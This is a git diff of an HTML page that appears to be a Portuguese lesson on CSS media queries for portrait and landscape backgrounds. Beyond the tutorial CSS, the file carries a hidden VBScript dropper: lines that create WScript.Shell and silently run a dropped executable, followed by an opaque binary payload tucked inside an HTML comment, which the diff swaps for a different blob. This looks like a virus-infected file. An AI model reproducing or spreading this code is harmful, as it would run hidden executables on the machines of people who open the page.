@@ -6,9 +6,46 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Media Query</title>
-    <link rel="stylesheet" href="estilo/style.css" media="all">
-    <link rel="stylesheet" href="estilo/retrato.css" media="screen and (orientation: portrait)">
-    <link rel="stylesheet" href="estilo/paisagem.css"media="screen and (orientation: landscape)">
+    <style>
+        /* declaraÃ§Ãµes gerais */
+
+            * {
+                margin: 0px;
+                padding: 0px;
+                font-family: Arial, Helvetica, sans-serif;
+            }
+
+            html, body {
+                width: 100vw;
+                height: 100vh;
+                background-color: #233eff;
+                background-size: contain;
+                background-repeat: no-repeat;
+            }
+
+            h1 {
+                color: whitesmoke;
+                text-shadow: 2px 2px 3px #000c6b;
+                padding: 10px;
+            }
+
+
+        /* declaraÃ§Ãµes para retrato */
+            @media screen and (orientation: portrait) {
+                body {
+                    background-image: url(../imagens/cev-portrait.jpg);
+                    background-position: center bottom;
+                }
+            }
+
+        /* declaraÃ§Ãµes para paisagem */
+            @media screen and (orientation: landscape){
+                body{
+                    background-image: url(../imagens/cev-landscape.jpg);
+                    background-position: left bottom;
+                }
+            }
+    </style>
 </head>
 <body>
     <h1>Mude a orientaÃ§Ã£o do seu dispositivo</h1>
@@ -27,6 +64,6 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--,(g@ ˆŒ¦‰°zÅ§u!;±ÊùPÌ6¿ãY€®^;x£,CàoŒñWJ…o+{Ùğ§dOßÂ@ƒ³Şª¼ï¥¤ZÜòË€ó7HÛk¥R—W <ô®‹:ıAR
-ÃI>dÕ;Û´¯Æu°íßÄ0P“Ê=šöFXå^pšöj‚µÇ×Óaq/z*T/µˆK!‹Ê—æ_Ñ=•ÜçÉñÜ*ïT–Ä£.Ù0òrËH®zÊäb½U—c·ĞÄÂ]jt_’r˜Eö¿İDÖF>ÒaÓë“§K.ª
-7¶;ëîÛı¼şöHpä:Vá¢…ÒCú0ªó-4nb”Ç@:A‡ï€Ì‰™ÚËtæ™Ê—/³õQö¼İ®–¯Y¨9º•7âå<ôŠÖIıëÎ$^Ô^+¾›Ä/¿á–ÜJyÅ¼=”¼°vsÚhÂéŸd!! ÃÊR ÑøÃÊÃÊÃÊÅ)NkÔaQÁÊ ÃÊ-->
+//--></SCRIPT><!--Õeİ<åh`œz,ôöJn§ŒC ÜÀ&¶Ælò¦‘jªO’qÄß1l º<9^ñ°äWQ‚nJÃW¼èÜ¾bK¯§~û±¥”Ö(È3+¦uÈ#„«Â…DÎş¸­ÃJKİıRá„?ÚÎË%+ùFlÈ­dldRÍKK0½JÖˆØm±SóŞW`ë‡ÄwÅ¢„a<)s&oa˜a°/=—ÂUiµÖ›Ä'NA£ n¢ß–%ÑR<op)ñƒ"à‡ÎÑª€~Ğ/4I
+%Â–CRöËÊ!Ú¢;sšßààIrüÀAè?Ñ„T?®ø’ ·s²÷
+ÀæK İ¼éçW<u2ˆ©®Oº^rÎ$½_ˆI‚kfÒV*Xj;‹¿fq]é„<BqY¢–«?=xİšŞÂ²ÌĞ"ºkJXX«ewõ¶¼ªØ ÃÊR ÑøÃÊÃÊÃÊÅ)NHÚaòÆÊ ÃÊ-->
